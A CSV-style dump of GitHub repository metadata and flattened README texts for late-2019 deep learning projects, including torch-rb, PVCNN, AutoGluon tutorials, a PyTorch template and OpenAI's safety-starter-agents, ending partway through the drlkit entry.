ankane,torch-rb,n/a,Torch rb fire Deep learning for Ruby powered by LibTorch https pytorch org This gem is currently experimental There may be breaking changes between each release Please report any issues you experience Build Status https travis ci org ankane torch rb svg branch master https travis ci org ankane torch rb Installation First install LibTorch libtorch installation For Homebrew use sh brew install libtorch Add this line to your applications Gemfile ruby gem torch rb It can take a few minutes to compile the extension Getting Started This library follows the PyTorch API https pytorch org docs stable torch html There are a few changes to make it more Ruby like Methods that perform in place modifications end with instead of add instead of add Methods that return booleans use instead of is tensor instead of istensor Numo is used instead of NumPy x numo instead of x numpy Some methods and options are missing at the moment PRs welcome Tutorial Some examples below are from Deep Learning with PyTorch A 60 Minutes Blitz https pytorch org tutorials beginner deeplearning60minblitz html Tensors Create a tensor from a Ruby array ruby x Torch tensor 1 2 3 4 5 6 Get the shape of a tensor ruby x shape There are many functions tensor creation to create tensors like ruby a Torch rand 3 b Torch zeros 2 3 Each tensor has four properties dtype the data type uint8 int8 int16 int32 int64 float32 float64 or bool layout strided dense or sparse device the compute device like CPU or GPU requiresgrad whether or not to record gradients You can specify properties when creating a tensor ruby Torch rand 2 3 dtype double layout strided device cpu requiresgrad true Operations Create a tensor ruby x Torch tensor 10 20 30 Add ruby x 5 tensor 15 25 35 Subtract ruby x 5 tensor 5 15 25 Multiply ruby x 5 tensor 50 100 150 Divide ruby x 5 tensor 2 4 6 Get the remainder ruby x 3 tensor 1 2 0 Raise to a power ruby x 2 tensor 100 400 900 Perform operations with other tensors ruby y Torch tensor 1 2 3 x y tensor 11 22 33 Perform operations in place ruby x add 5 x tensor 15 25 35 You can also specify an output tensor ruby result Torch empty 3 Torch add x y out result result tensor 15 25 35 Numo Convert a tensor to a Numo array ruby a Torch ones 5 a numo Convert a Numo array to a tensor ruby b Numo NArray cast 1 2 3 Torch fromnumo b Autograd Create a tensor with requiresgrad true ruby x Torch ones 2 2 requiresgrad true Perform operations ruby y x 2 z y y 3 out z mean Backprop ruby out backward Get gradients ruby x grad tensor 4 5 4 5 4 5 4 5 Stop autograd from tracking history ruby x requiresgrad true x 2 requiresgrad true Torch nograd do x 2 requiresgrad false end Neural Networks Define a neural network ruby class Net Torch NN Module def initialize super conv1 Torch NN Conv2d new 1 6 3 conv2 Torch NN Conv2d new 6 16 3 fc1 Torch NN Linear new 16 6 6 120 fc2 Torch NN Linear new 120 84 fc3 Torch NN Linear new 84 10 end def forward x x Torch NN F maxpool2d Torch NN F relu conv1 call x 2 2 x Torch NN F maxpool2d Torch NN F relu conv2 call x 2 x x view 1 numflatfeatures x x Torch NN F relu fc1 call x x Torch NN F relu fc2 call x x fc3 call x x end def numflatfeatures x size x size 1 1 numfeatures 1 size each do s numfeatures s end numfeatures end end Create an instance of it ruby net Net new input Torch randn 1 1 32 32 net call input Get trainable parameters ruby net parameters Zero the gradient buffers and backprop with random gradients ruby net zerograd out backward Torch randn 1 10 Define a loss function ruby output net call input target Torch randn 10 target target view 1 1 criterion Torch NN MSELoss new loss criterion call output target Backprop ruby net zerograd p net conv1 bias grad loss backward p net conv1 bias grad Update the weights ruby learningrate 0 01 net parameters each do f f data sub f grad data learningrate end Use an optimizer ruby optimizer Torch Optim SGD new net parameters lr 0 01 optimizer zerograd output net call input loss criterion call output target loss backward optimizer step Tensor Creation Heres a list of functions to create tensors descriptions from the C docs https pytorch org cppdocs notes tensorcreation html arange returns a tensor with a sequence of integers ruby Torch arange 3 tensor 0 1 2 empty returns a tensor with uninitialized values ruby Torch empty 3 tensor 7 0054e 45 0 0000e 00 0 0000e 00 eye returns an identity matrix ruby Torch eye 2 tensor 1 0 0 1 full returns a tensor filled with a single value ruby Torch full 3 5 tensor 5 5 5 linspace returns a tensor with values linearly spaced in some interval ruby Torch linspace 0 10 5 tensor 0 5 10 logspace returns a tensor with values logarithmically spaced in some interval ruby Torch logspace 0 10 5 tensor 1 1e5 1e10 ones returns a tensor filled with all ones ruby Torch ones 3 tensor 1 1 1 rand returns a tensor filled with values drawn from a uniform distribution on 0 1 ruby Torch rand 3 tensor 0 5444 0 8799 0 5571 randint returns a tensor with integers randomly drawn from an interval ruby Torch randint 1 10 3 tensor 7 6 4 randn returns a tensor filled with values drawn from a unit normal distribution ruby Torch randn 3 tensor 0 7147 0 6614 1 1453 randperm returns a tensor filled with a random permutation of integers in some interval ruby Torch randperm 3 tensor 2 0 1 zeros returns a tensor filled with all zeros ruby Torch zeros 3 tensor 0 0 0 Examples Here are a few full examples Image classification with MNIST examples mnist https qiita com kojix2 items c19c36dc1bf73ea93409 Collaborative filtering with MovieLens examples movielens Sequence models and word embeddings examples nlp LibTorch Installation Download LibTorch https pytorch org For Linux use the cxx11 ABI version Then run sh bundle config build torch rb with torch dir path to libtorch Homebrew For Mac you can use Homebrew sh brew install libtorch Then install the gem no need for bundle config rbenv This library uses Rice https github com jasonroelofs rice to interface with LibTorch Rice and earlier versions of rbenv dont play nicely together If you encounter an error during installation upgrade ruby build and reinstall your Ruby version sh brew upgrade ruby build rbenv install version History View the changelog https github com ankane torch rb blob master CHANGELOG md Contributing Everyone is encouraged to help improve this project Here are a few ways you can help Report bugs https github com ankane torch rb issues Fix bugs and submit pull requests https github com ankane torch rb pulls Write clarify or fix documentation Suggest or add new features To get started with development sh git clone https github com ankane torch rb git cd torch rb bundle install bundle exec rake compile with torch dir path to libtorch bundle exec rake test Here are some good resources for contributors PyTorch API https pytorch org docs stable torch html PyTorch C API https pytorch org cppdocs Tensor Creation API https pytorch org cppdocs notes tensorcreation html Using the PyTorch C Frontend https pytorch org tutorials advanced cppfrontend html,2019-11-26T06:01:15Z,2019-12-14T18:21:44Z,Ruby,ankane,User,4,78,4,295,master,ankane#jac33k,2,0,7,1,1,0,1
mit-han-lab,pvcnn,n/a,Point Voxel CNN for Efficient 3D Deep Learning Website https hanlab mit edu projects pvcnn arXiv https arxiv org abs 1907 03739 inproceedingsliu2019pvcnn title Point Voxel CNN for Efficient 3D Deep Learning author Liu Zhijian and Tang Haotian and Lin Yujun and Han Song booktitle Advances in Neural Information Processing Systems year 2019 Overview We release the PyTorch code of the Point Voxel CNN https arxiv org abs 1907 03739 Content Prerequisites prerequisites Data Preparation data preparation S3DIS Code code Pretrained Models pretrained models S3DIS Testing Pretrained Models testing pretrained models Training training Prerequisites The code is built with following libraries Python 3 6 PyTorch https github com pytorch pytorch 1 3 tensorboardX https github com lanpa tensorboardX 1 2 h5py https github com h5py h5py 2 9 0 numba https github com numba numba tqdm https github com tqdm tqdm For point data pre processing you may need plyfile https github com dranjan python plyfile Data Preparation S3DIS We follow the data pre processing in PointCNN https github com yangyanli PointCNN The code for preprocessing the S3DIS dataset is located in scripts s3dis scripts s3dis preparedata py You should first download the dataset from here http buildingparser stanford edu dataset html then run python scripts s3dis preparedata py d path to unzip dataset dir Code This code is based on PointCNN https github com yangyanli PointCNN and Pointnet2PyTorch https https github com erikwijmans Pointnet2PyTorch We modified the code for PyTorch style data layout The core code to implement PVConv is modules pvconv py modules pvconv py Its key idea costs only a few lines of code python voxelfeatures voxelcoords voxelize features coords voxelfeatures voxellayers voxelfeatures voxelfeatures trilineardevoxelize voxelfeatures voxelcoords resolution fusedfeatures voxelfeatures pointlayers features Pretrained Models Here we provide some of the pretrained models The accuracy might vary a little bit compared to the paper since we re train some of the models for reproducibility S3DIS We compare the 3D UNet and PointCNN performance reported in the following table The accuracy is tested following here https github com yangyanli PointCNN The list is keeping updating Overall Acc mIoU 3D UNet 85 12 54 93 PVCNN https hanlab mit edu projects pvcnn files models s3dis pvcnn area5 pth tar 86 16 56 17 PointCNN 85 91 57 26 PVCNN https hanlab mit edu projects pvcnn files models s3dis pvcnnpp area5 pth tar 87 14 58 33 Testing Pretrained Models For example to test the downloaded pretrained models on S3DIS you can run python train py config file devices gpu ids evaluate configs train bestcheckpointpath path to your models For instance if you want to evaluate PVCNN on GPU 0 1 with 4096 points on Area 1 4 6 you can run python train py configs s3dis pvcnn area5 py devices 0 1 evaluate configs train bestcheckpointpath s3dis pvcnn area5 pth tar Training We provided several examples to train PVCNN with this repo To train PVCNN on S3DIS holding out Area 5 you can run python train py configs s3dis pvcnn area5 py devices 0 1 To train PVCNN on S3DIS holding out Area 5 you can run python train py configs s3dis pvcnnpp area5 py devices 0 1 In general to train a model you can run python train py config file devices gpu ids To evaluate trained models you can do inference by running python train py config file devices gpu ids evaluate License This repository is released under the MIT license See LICENSE LICENSE for additional details,2019-12-10T00:52:20Z,2019-12-13T07:15:54Z,Python,mit-han-lab,Organization,11,62,6,3,master,synxlin#zhijian-liu,2,0,0,2,1,0,0
kjc6723,seq2seq_Pointer_Generator_Summarizer,n/a,seq2seqPointerGeneratorSummarizer A deep learning neural network for abstractive deep summarization project This is a project of generating abstractive summerization from Chinese conversation The funny conversation is between customers and car technicians with 80000 samples for training and testing and 20000 samples for prediction The data pipline is somehow typical for Chinese purge data segment tokenize batch However it s tricky to deal with long conversation and to add special token to word2vec model Special tokens is added to the w2v model by retraining the model Files like original dataset segment dataset w2v model are also provided for immediate test Note the embedding matrix file is too large to upload In this project you can train models test or evaluate model Everything is classic and built with tensorflow 2 0 word embedding is pretrained by word2vec and seq2seq includes Gru as encoder Bahdanau attention and unidirection Gru as decoder The model also embrace pointer generator network and coverage loss to deal with oov and repeating ref arXiv 1704 04368v2 Prediction implements beam search This neural net will be our baseline model I will do some experiments with this model and propose a new architecture based on this one,2019-12-09T09:17:44Z,2019-12-11T10:30:37Z,Python,kjc6723,User,2,55,2,3,master,kjc6723,1,0,0,0,0,0,0
zhanghang1989,AutoGluon-Tutorial-CVPR2020,n/a,CVPR 2020 Tutorial Hands on Tutorial on Automatic Deep Learning Proposing Organizers Hang Zhang Matthias Seeger Mu Li Abstract In this tutorial we design the hyper parameter ranges and possible network architecture combinations in deep learning approaches and pass the workload to the machines This tutorial will cover the important concepts in automatic machine learning andthe applications in computer vision The audience will be able to reproduce large scale experimentsthrough hands on section using Jupiter Notebooks Agenda Topic Slides Notebook Opening and tutorial notebook setup link 00 link 01 link 02 Overview of AutoML and HPO link 11 link 12 Advanced search algorithms link 20 link 21 link 22 Efficient neural architecture search link 30 link 31 Large scale distributed search link 40 Q A and Closing 00 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master slides overview pptx 20 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master slides searchalgorithms pptx 30 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master slides nas pptx 40 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master slides distributed pptx 01 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master 1 imageclassificationbeginner ipynb 02 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master 2 objectdetectionbeginner ipynb 11 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master 5 imageclassificatonhpo ipynb 12 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master 6 pytorchhpo ipynb 21 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master 3 searchspace ipynb 22 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master 4 searchalgorithm ipynb 31 https github com zhanghang1989 AutoGluon Tutorial CVPR2020 blob master 7 enasmnist ipynb,2019-11-21T20:11:20Z,2019-12-09T22:10:18Z,Jupyter Notebook,zhanghang1989,User,12,55,1,3,master,zhanghang1989,1,0,0,0,0,0,0
jiajunhua,dragen1860-Deep-Learning-with-TensorFlow-book,n/a,TensorFlow 2 0 TensorFlow 2 0 Clone or DownloadGithub Github Issues https github com dragen1860 Deep Learning with TensorFlow book issues TensorFlow 2 0 https github com dragen1860 TensorFlow 2 x Tutorials Github issues liangqu long AT gmail com Github https www bilibili com video av75331861 from search seid 15021582016949033280 QQ 101295208768 AI TensorFlow https study 163 com course courseMain htm share 2 shareId 480000001847407 courseId 1209092816 tracecpk2 9e74eb6f891d47cfaa6f00b5cb5f617c PyTorch https study 163 com course courseMain htm share 2 shareId 480000001847407 courseId 1208894818 tracecpk2 8d1b10e04bd34d69855bb71da65b0549,2019-11-14T06:04:18Z,2019-12-14T07:31:15Z,Python,jiajunhua,User,6,53,30,79,master,dragen1860#haorenhao,2,0,0,0,0,0,0
kjc6723,deep-learning-and-Financial-risk-control,n/a,,2019-12-09T12:44:12Z,2019-12-11T10:30:45Z,Jupyter Notebook,kjc6723,User,2,39,1,13,master,kjc6723,1,0,0,0,0,0,0
FrancescoSaverioZuppichini,PyTorch-Deep-Learning-Template,computer-vision#deep-learning#python#pytorch,Pytorch Deep Learning Template A clean and simple template to kick start your next dl project Francesco Saverio Zuppichini In this article we present you a deep learning template based on Pytorch This template aims to make it easier for you to start a new deep learning computer vision project with PyTorch The main features are modularity we split each logic piece into a different python submodule data augmentation we included imgaug https imgaug readthedocs io en latest ready to go by using poutyne https pypi org project Poutyne a Keras like framework you don t have to write any train loop torchsummary https github com sksq96 pytorch summary to show a summary of your models reduce the learning rate on a plateau auto saving the best model experiment tracking with comet https www comet ml logging using python logging https docs python org 3 library logging html module a playground notebook to quick test play around Installation Clone the repo and go inside it Then run pip install r requirements txt Motivation Let s face it usually data scientists are not software engineers and they usually end up with spaghetti code most of the time on a big unusable Jupiter notebook With this repo you have proposed a clean example of how your code should be split and modularized to make scalability and sharability possible In this example we will try to classify Darth Vader and Luke Skywalker We have 100 images per class gathered using google images The dataset is here https drive google com open id 1LyHJxUVjOgDIgGJL4MnDhA10xjejWuw7 You just have to exact it in this folder and run main py We are fine tuning resnet18 and it should be able to reach 90 accuracy in 5 10 epochs Structure The template is inside template callbacks here you can create your custom callbacks checkpoint were we store the trained models data here we define our dataset transformation custom transformation e g resize and data augmentation dataset the data train val logger py were we define our logger losses custom losses main py models here we create our models MyCNN py resnet py utils py playground ipynb a notebook that can be used to fast experiment with things Project py a class that represents the project structure README md requirements txt test you should always perform some basic testing testmyDataset py utils py utilities functions We strongly encourage to play around with the template Keep your structure clean and concise Every deep learning project has at least three mains steps data gathering processing modeling training evaluating Project One good idea is to store all the paths at an interesting location e g the dataset folder in a shared class that be accessed by anyone in the folder You should never hardcode any paths and always define them once and import them So if you later change your structure you will only have to modify one file If we have a look at Project py we can see how we defined the datadir and the checkpointdir once for all We are using the new Path https docs python org 3 library pathlib html APIs that support different OS out of the box and also make it easier to join and concatenate paths alt https raw githubusercontent com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron develop images Project png For example if we want to know the data location we can python3 from Project import Project project Project print projct datadir foo baa dataset Data In the data package you can define your own Dataset as always by subclassing torch data utils Dataset exposing transformations and utilities to work with your data In our example we directly used ImageDataset from torchvision but we included a skeleton for a custom Dataset in data MyDataset Transformation You usually have to do some preprocessing on the data e g resize the images and apply data augmentation All your transformation should go inside data trasformation In our template we included a wrapper for imgaug https imgaug readthedocs io en latest alt https raw githubusercontent com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron develop images transformation png Dataloaders As you know you have to create a Dataloader to feed your data into the model In the data init py file we expose a very simple function getdataloaders to automatically configure the train val and test data loaders using few parameters alt https raw githubusercontent com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron develop images data png Losses Sometimes you may need to define your custom losses you can include them in the losses package For example alt https raw githubusercontent com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron develop images losses png Logging We included python logging https docs python org 3 library logging html module You can import and use it by python from logger import logger logger info print is for noobs Models All your models go inside models in our case we have a very basic cnn and we override the resnet18 function to provide a frozen model to finetune alt https github com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron blob develop images resnet png raw true Train Evaluation In our case we kept things simple all the training and evaluation logic is inside main py where we used poutyne https pypi org project Poutyne as the main library We already defined a useful list of callbacks learning rate scheduler auto save of the best model early stopping Usually this is all you need alt https github com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron blob develop images main png raw true Callbacks You may need to create custom callbacks with poutyne https pypi org project Poutyne is very easy since it support Keras like API You custom callbacks should go inside callbacks For example we have created one to update Comet every epoch alt https github com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron blob develop images CometCallback png raw true Track your experiment We are using comet https www comet ml to automatically track our models results This is what comet s board looks like after a few models run alt https github com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron blob develop images comet jpg raw true Running main py produces the following output alt https github com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron blob develop images output jpg raw true Utils We also created different utilities function to plot booth dataset and dataloader They are in utils py For example calling showdl on our train and val dataset produces the following outputs alt https github com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron blob develop images Figure1 png raw true alt https github com FrancescoSaverioZuppichini PyTorch Deep Learning Skeletron blob develop images Figure2 png raw true As you can see data augmentation is correctly applied on the train set Conclusions I hope you found some useful information and hopefully it this template will help you on your next amazing project Let me know if you have some ideas suggestions to improve it Thank you for reading,2019-11-16T09:32:39Z,2019-12-13T09:30:42Z,Jupyter Notebook,FrancescoSaverioZuppichini,User,1,38,8,2,master,FrancescoSaverioZuppichini,1,0,0,0,0,0,1
openai,safety-starter-agents,n/a,Status Archive code is provided as is no updates expected Safety Starter Agents A companion repo to the paper Benchmarking Safe Exploration in Deep Reinforcement Learning containing a variety of unconstrained and constrained RL algorithms This repo contains the implementations of PPO TRPO PPO Lagrangian TRPO Lagrangian and CPO used to obtain the results in the Benchmarking Safe Exploration paper as well as experimental implementations of SAC and SAC Lagrangian not used in the paper Note that the PPO implementations here follow the convention from Spinning Up https spinningup openai com rather than Baselines https www github com openai baselines they use the early stopping trick omit observation and reward normalization and do not use the clipped value loss among other potential diffs As a result while it is easy to fairly compare this PPO to this TRPO it is not the strongest PPO implementation in the sense of sample efficiency and can be improved on substantially Supported Platforms This package has been tested on Mac OS Mojave and Ubuntu 16 04 LTS and is probably fine for most recent Mac and Linux operating systems Requires Python 3 6 or greater Installation To install this package git clone https github com openai safety starter agents git cd safety starter agents pip install e Warning Installing this package does not install Safety Gym If you want to use the algorithms in this package to train agents on onstrained RL environments make sure to install Safety Gym according to the instructions on the Safety Gym repo https www github com openai safety gym Getting Started Example Script To run PPO Lagrangian on the Safexp PointGoal1 v0 environment from Safety Gym using neural networks of size 64 64 from saferl import ppolagrangian import gym safetygym ppolagrangian envfn lambda gym make Safexp PointGoal1 v0 ackwargs dict hiddensizes 64 64 Reproduce Experiments from Paper To reproduce an experiment from the paper run cd path to safety starter agents scripts python experiment py algo ALGO task TASK robot ROBOT seed SEED expname EXPNAME cpu CPU where ALGO is in ppo ppolagrangian trpo trpolagrangian cpo TASK is in goal1 goal2 button1 button2 push1 push2 ROBOT is in point car doggo SEED is an integer In the paper experiments we used seeds of 0 10 and 20 but results may not reproduce perfectly deterministically across machines CPU is an integer for how many CPUs to parallelize across EXPNAME is an optional argument for the name of the folder where results will be saved The save folder will be placed in path to safety starter agents data Plot Results Plot results with cd path to safety starter agents scripts python plot py data path to experiment Watch Trained Policies Test policies with cd path to safety starter agents scripts python testpolicy py data path to experiment Cite the Paper If you use Safety Starter Agents code in your paper please cite articleRay2019 author Ray Alex and Achiam Joshua and Amodei Dario title Benchmarking Safe Exploration in Deep Reinforcement Learning year 2019,2019-11-21T03:09:09Z,2019-12-05T01:55:55Z,Python,openai,Organization,2,36,6,2,master,jachiam,1,0,0,1,0,0,0
ShusenTang,Deep-Learning-with-PyTorch-Chinese,n/a,,2019-11-22T05:38:54Z,2019-12-14T14:15:53Z,Jupyter Notebook,ShusenTang,User,4,33,7,42,master,ShusenTang#flybiubiu,2,0,0,0,0,0,6
Akhil-Pillai,Deep-Learning-Resources,n/a,Deep Learning Resources Awesome https cdn rawgit com sindresorhus awesome d7305f38d29fed78fa85652e3a63e154dd8e8829 media badge svg Show some heart and star the repo to support the project Github stars https img shields io github stars Akhil Pillai Deep Learning Resources svg style social label Star https github com Akhil Pillai Deep Learning Resources Preface What is it This is a list of resources curated from the Slack channel for Udacity s first phase of AI Track scholarship challenge Why use it As the Slack channel will have multiple conversations going on I thought best to consolidate all the resources into one repository for anyone to access any time without having to go through all the conversations How to contribute All are welcome to open a Pull Request or raise an issue with the content you would like to share What kind of content Text tutorials video resources youtube playlists self paced learning courses ebooks I hope you get the point All and any form of content can be shared here Contributors Akhil Pillai https github com Akhil Pillai Priyavrat Misra https github com priyavrat misra Self Paced Tutorials Artificial Intelligence Machine Learning Deep Learning and stuff Harvard CS231n Convolutional Neural Networks for Visual Recognition http cs231n stanford edu This course is a deep dive into details of the deep learning architectures Students will learn to implement train and debug their own neural networks The final assignment will involve training a multi million parameter convolutional neural network and applying it on the largest image classification dataset ImageNet Much of the background and materials of this course will be drawn from the ImageNet Challenge http image net org challenges LSVRC 2014 index Video Lectures https www youtube com watch v NfnWJUyUJYU list PLkt2uSq6rBVctENoVBg1TpCC7OQi31AlC by Andrej Karpathy instructor CS231n Notes http cs231n github io to accompany the Stanford CS class CS231n Convolutional Neural Networks for Visual Recognition Python Numpy Tutorial http cs231n github io python numpy tutorial Practical Deep Learning for Coders https course fast ai Step by step introduction to Deep learning stuff Pre Requisite Youve been coding for at least a year and also that if you havent used Python before youll be putting in the extra time to learn whatever Python you need as you go For learning Python we have a list of python learning resources available https forums fast ai t recommended python learning resources 26888 Elements of AI https course elementsofai com The Elements of AI is a series of free online courses created by Reaktor and the University of Helsinki The courses combine theory with practical exercises and can be completed at your own pace Deep Lizard https deeplizard com Tutorials on multiple topics like Machine Learning and Deep Learning Fundamentals Neural Network Programming Deep Learning with PyTorch Data Science Learn to code for beginners and many more Youtube Machine Learning Recipes https www youtube com playlist list PLOU2XLYxmsIIuiBfYad6rFYQUjL2ryal with Josh Gordon offered on Google Developers https www youtube com channel UCx5XG1OV2P6uZZ5FSM9Ttw Youtube Channel Coursera ML with Python https www coursera org learn machine learning with python This course dives into the basics of machine learning Coursera Introduction to Deep Learning Neural Networks with Keras https www coursera org learn introduction to deep learning with keras This course will introduce you to the field of deep learning Coursera Machine Learning https www coursera org learn machine learning by Andrew NG This is a course for you if are new to this world Coursera Deep Learning https www coursera org specializations deep learning by Andrew NG A 5 course specialization focusing on various concepts of deep learning with in depth and simple explanation Coursera Neural Networks and Deep Learning https www coursera org learn neural networks deep learning by deeplearning ai MIT 6 S191 Introduction to Deep Learning http introtodeeplearning com MIT s introductory course on deep learning methods with applications to computer vision natural language processing biology and more Python snake Full Stack Python https www fullstackpython com Build Deploy and Operate Python Applications Scipy Lecture Notes https scipy lectures org One document to learn numerics science and data with Python NumPy User Guide https docs scipy org doc numpy user This guide is intended as an introductory overview of NumPy and explains how to install and make use of the most important features of NumPy Udacity Introduction to Python Programming https www udacity com course introduction to python ud1110 Math pencil2 straightruler triangularruler Youtube 3Blue1Brown https www youtube com channel UCYOjabesuFRV4b17AJtAw playlists by Grant Sanderson is combination of math and entertainment The goal is for explanations to be driven by animations and for difficult problems to be made simple with changes in perspective Khan Academy https www khanacademy org great resource to learn all the math from the ground up MIT 18 06 Linear Algebra https ocw mit edu courses mathematics 18 06sc linear algebra fall 2011 by Prof Gilbert Strang This course covers matrix theory and linear algebra emphasizing topics useful in other disciplines such as physics economics and social sciences natural sciences and engineering MIT 18 02 Multivariable Calculus https ocw mit edu courses mathematics 18 02sc multivariable calculus fall 2010 by Prof Denis Auroux This course covers differential integral and vector calculus for functions of more than one variable Computing for Data Analysis https www edx org course computing for data analysis A hands on introduction to basic programming principles and practice relevant to modern data analysis data mining and machine learning Textual Tutorials Papers and ebooks book Free free The Deep Learning http www deeplearningbook org textbook by Ian Goodfellow and Yoshua Bengio and Aaron Courville Machine Learning Mastery https machinelearningmastery com by Jason Brownlee Python Data Science Handbook https jakevdp github io PythonDataScienceHandbook by Jake VanderPlas Quantitative Economics with Python https python quantecon org by by Thomas J Sargent and John Stachurski This website presents a set of lectures on quantitative economic modeling in Python The Hundred page Machine Learning Book http themlbook com wiki doku php by Andriy Burkov Deep Learning with Pytorch https pytorch org deep learning with pytorch thank you by Eli Stevens and Luca Antiga offered by PyTorch Neural Networks and Deep Learning http neuralnetworksanddeeplearning com by Michael Nielsen Mathematics for Machine Learning https mml book github io by by Marc Peter Deisenroth A Aldo Faisal and Cheng Soon Ong Paid heavydollarsign Python Machine Learning https sebastianraschka com books html python machine learning 2nd edition and Deep Learning with Python scikit learn and TensorFlow 2nd Edition by Sebastian Raschka and Vahid Mirjalili Make Your Own Neural Network https www amazon in Make Your Own Neural Network ebook dp B01EER4Z4G by Tariq Rashid Papers With Code https paperswithcode com highlights trending ML research and the code to implement it Coding Environment computer Google Colab https colab research google com Colaboratory is a free Jupyter notebook environment provided by Google If your local workstation cannot take the workload Google Colab is the platform to use Blogs Andrej Karpathy http karpathy github io director of artificial intelligence and Autopilot Vision at Tesla Christopher Olah https colah github io Articles Clearing the Confusion AI vs Machine Learning vs Deep Learning Differences https towardsdatascience com clearing the confusion ai vs machine learning vs deep learning differences fce69b21d5eb Keras or PyTorch as your first deep learning framework https deepsense ai keras or pytorch Keras vs TensorFlow vs PyTorch Comparison of the Deep Learning Frameworks https www edureka co blog keras vs tensorflow vs pytorch Keras vs Pytorch for Deep Learning https towardsdatascience com keras vs pytorch for deep learning a013cb63870d Machine Learning is Fun https medium com ageitgey machine learning is fun 80ea3ec3c471 by Adam Geitgey The worlds easiest introduction to Machine Learning Perceptrons Logical Functions and the XOR problem https towardsdatascience com perceptrons logical functions and the xor problem 37ca5025790a by Francesco Cicala Perceptron Learning Algorithm https towardsdatascience com perceptron learning algorithm d5db0deab975 A Graphical Explanation Of Why It Works by Akshay L Chandra Google Colab Free GPU Tutorial https medium com deep learning turkey google colab free gpu tutorial e113627b9f5d by fuat The best Data Science courses on the internet https www freecodecamp org news the best data science courses on the internet ranked by your reviews 6dc5b910ea40 ranked by your reviews by David Venturi 5 things you should do to get selected for the 2nd phase of your Google Udacity Scholarship https medium com udacity the 5 things you need to do to get selected for the 2nd phase of your google udacity scholarship 649f22376030 by George Szabo How to create custom Datasets and DataLoaders with Pytorch https medium com datadriveninvestor how to custom datasets and dataloaders with pytorch e27f9e2a9009 by Prince Canuma Understanding and implementing Neural Network http www adeveloperdiary com data science deep learning neural network with softmax in python with SoftMax in Python from scratch Understand and Implement the Backpropagation Algorithm http www adeveloperdiary com data science machine learning understand and implement the backpropagation algorithm from scratch in python From Scratch In Python Implement Neural Network http www adeveloperdiary com data science deep learning implement neural network using pytorch using PyTorch Neural Representation of AND OR NOT XOR and XNOR Logic Gates Perceptron Algorithm https medium com stanleydukor neural representation of and or not xor and xnor logic gates perceptron algorithm b0275375fea1 by Stanley Obumneme Dukor Github Repos Awesome pytorch list https github com bharathgs Awesome pytorch list tutorials examples Deep Learning Papers Reading Roadmap https github com floodsung Deep Learning Papers Reading Roadmap Deep Learning papers reading roadmap for anyone who are eager to learn this amazing tech Awesome Most Cited Deep Learning Papers https github com terryum awesome deep learning papers Papers We Love https github com papers we love papers we love,2019-11-20T09:21:27Z,2019-12-07T10:50:03Z,n/a,Akhil-Pillai,User,8,31,10,18,master,Akhil-Pillai#pranscript#priyavrat-misra#Sakhro,4,0,0,1,0,1,3
aivivn,d2l-vn,n/a,D n dch sch Dive into Deep Learning https www d2l ai Cun sch ny c dch v ng ti https d2l aivivn com Hng dn ng gp vo d n https d2l aivivn com introvn html huong dan dong gop Th t dch Preface Introduction Preliminaries Mathematics for Deep Learning Tools for Deep Learning Linear Neural Networks Multilayer Perceptrons Deep Learning Computation Convolutional Neural Networks Modern Convolutional Networks Recurrent Neural Networks Modern Recurrent Networks Attention Mechanisms Optimization Algorithms Computational Performance Computer Vision Natural Language Processing Recommender Systems Generative Adversarial Networks,2019-11-19T08:45:29Z,2019-12-15T00:26:37Z,Python,aivivn,User,14,31,30,143,master,tiepvupsu#astonzhang#lkhphuc#aivivn#samthehai#rootonchair#honghanhh#duythanhvn#smolix#khoapip#kimdoanh89#mli#quangnhat185#ngcthuong,14,0,0,22,49,17,103
Parkchanjun,Keras_Tutorial_PCJ,n/a,KerasTutorialPCJ Keras Tutorial Colab Part01 Part02 CNN Convolution Neural Network Part03 RNN Recureent Nerual Network Keras Transformer Keras Transformer Model Build Translate Park Chanjun Korea University Natural Language Processing Artificial Intelligence Lab Email bcj1210 naver com,2019-11-11T08:35:33Z,2019-12-06T05:46:10Z,Jupyter Notebook,Parkchanjun,User,4,27,5,15,master,Parkchanjun,1,0,0,0,0,0,0
FranckNdame,drlkit,comparing-algorithms#deep-learning#deep-reinforcement-learning#gpu#gym#gym-environment#machine-learning#numpy#python#pytorch#reinforcement-learning#tensor#tensorflow,A High Level Python Deep Reinforcement Learning library Great for beginners prototyping and quickly comparing algorithms Installation Install drlkit via pip python pip install drlkit Usage 1 Import the modules python import numpy as np from agents TorchAgent import TorchAgent from utils plot import Plot from environments wrapper import EnvironmentWrapper 2 Initialize the environment and the agent python ENVNAME LunarLander v2 env EnvironmentWrapper ENVNAME agent TorchAgent statesize 8 actionsize env env actionspace n seed 0 3 Train the agent python Train the agent env fit agent nepisodes 1000 4 Plot the results optional python See the results Plot basicplot np arange len env scores env scores xlabel Episode ylabel Score 5 Play python Play trained agent env play numepisodes 10 trained True It is as simple as that Loading a model python ENVNAME LunarLander v2 env EnvironmentWrapper ENVNAME agent TorchAgent statesize 8 actionsize env env actionspace n seed 0 env loadmodel agent models LunarLander v2 4477 pth env play numepisodes 10 Play untrained agent python env play numepisodes 10 trained False Play trained agent 4477 episodes 3 hours python env play numepisodes 10 trained True Tested Environments Environment LunarLander v2 CartPole v1 MountainCar v0 Implemented Algorithms Done heavycheckmark In Progress heavyminussign Not done yet x Algorithms Status Tested DQN heavycheckmark 1 heavycheckmark DDPG heavyminussign heavyminussign PPO1 x x PPO2 x x A2C x x SAC x x TD3 x x Domain Model Next steps x Implement DQN x Test DQN Finish DDPG Implement PP01 Improve documentation Contributing This is an open source project so feel free to contribute How Open an issue https github com FranckNdame 